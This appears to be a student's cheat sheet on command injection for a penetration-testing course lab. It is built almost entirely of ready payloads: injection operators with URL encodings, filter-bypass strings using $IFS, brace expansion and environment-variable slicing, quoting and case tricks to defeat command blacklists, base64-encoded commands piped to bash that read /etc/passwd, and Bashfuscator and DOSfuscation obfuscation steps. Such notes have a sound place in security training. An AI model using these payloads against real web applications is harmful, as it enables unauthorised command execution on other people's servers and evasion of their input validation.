https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion
# Detection
## Command Injection Methods

| **Injection Operator** | **Injection Character** | **URL-Encoded Character** | **Executed Command**                           |
| ------------------ | ------------------- | --------------------- | ------------------------------------------ |
| Semicolon          | ;                   | %3b                   | Both                                       |
| New Line           | \n                  | %0a                   | Both                                       |
| Background         | &                   | %26                   | Both (second output generally shown first) |
| Pipe               | \|                  | %7c                   | Both (only second output is shown)         |
| AND                | &&                  | %26%26                | Both (only if first succeeds)              |
| OR                 | \|\|                | %7c%7c                | Second (only if first fails)               |
| Sub-Shell          | ``                  | %60%60                | Both (Linux-only)                          |
| Sub-Shell          | $()                 | %24%28%29             | Both (Linux-only)                          |
# Injecting Commands
```bash
ping -c 1 127.0.0.1; whoami
```
## Bypassing Front-End Validation
#### Burp POST Request
![[command-inject-burp-post.png]]
# Bypassing Space Filters
## Bypass Blacklisted Operators
#### Using $IFS
`${IFS}`
`127.0.0.1%0a${IFS}`
#### Using Brace Expansion
```shell
{ls,-la}
```
`127.0.0.1%0a{ls,-la}`
# Bypassing Other Blacklisted Characters
## Linux
```bash
echo ${PATH}
```
`/`
```bash
echo ${PATH:0:1}
```
`;`
```bash
echo ${LS_COLORS:10:1}
```

`127.0.0.1${LS_COLORS:10:1}${IFS}`
## Windows
`/`
```powershell
echo %HOMEPATH:~6,-11%
```
`/`
```powershell
$env:HOMEPATH[0]
```

```powershell
$env:PROGRAMFILES[10]
```
## Character Shifting
```shell
man ascii
```

```shell
echo $(tr '!-}' '"-~'<<<[)
```
## Examples
```bash
ip=127.0.0.1%0als$IFS${PATH:0:1}home
```
# Bypassing Blacklisted Commands
## Commands Blacklist
A basic command blacklist filter in `PHP` would look like the following:
```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```
## Linux & Windows
```bash
w'h'o'am'i
```

```bash
w"h"o"am"i
```
`127.0.0.1%0aw'h'o'am'i`
## Linux Only
```bash
who$@ami
```

```bash
w\ho\am\i
```
## Windows Only
```cmd
who^ami
```
## Examples
```
%0ac"a"t$IFS${PATH:0:1}home${PATH:0:1}flag${PATH:0:1}flag.txt
```
# Advanced Command Obfuscation
## Case Manipulation
**Windows**
```powershell
WhOaMi
```
**Linux**
```bash
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

```bash
$(a="WhOaMi";printf %s "${a,,}")
```
## Reversed Commands
**Linux**
```bash
echo 'whoami' | rev
```

```bash
$(rev<<<'imaohw')
```
**Windows**
```powershell
"whoami"[-1..-20] -join ''
```

```powershell
iex "$('imaohw'[-1..-20] -join '')"
```
## Encoded Commands
**Linux**
```bash
echo -n 'cat /etc/passwd | grep 33' | base64
```

```shell
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

```url
%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
**Windows**
```powershell
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

```powershell
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```
## Examples
```shell
echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
```

```url
%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
```
# Evasion Tools
## Linux (Bashfuscator)
```git
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user
```
## Windows (DOSfuscation)
```powershell
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
help
```

```powershell
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
## Examples
```
/index.php?to=tmp&from=whoami%262470930823.txt&finish=1&move=1
```